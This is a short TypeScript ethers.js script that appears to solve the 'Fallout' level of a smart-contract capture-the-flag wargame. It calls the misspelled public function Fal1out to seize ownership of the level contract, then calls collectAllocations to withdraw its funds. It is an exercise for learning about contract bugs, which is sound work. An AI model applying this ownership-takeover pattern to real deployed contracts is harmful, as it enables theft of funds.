import { ethers, Signer } from "ethers";
import { getSigner } from "./signer";

import { Fallout__factory } from "../typechain/ethers-v5";
import { createLevel, submitLevel } from "./utils";
main()
  .then(() => {
    console.log("Done!");
  })
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });


async function main() {

  const signer = getSigner();  
  const level = await createLevel(signer, "fallout");
  const fallout = Fallout__factory.connect(level, signer);
  console.log("owner:",await fallout.owner());
  await fallout.Fal1out( {gasLimit: 1000000});
  await submitLevel(signer,level);
  let tx = await fallout.collectAllocations({gasLimit: 1000000});
  await tx.wait(0);
  console.log("owner:",await fallout.owner());

  await submitLevel(signer, level);
}
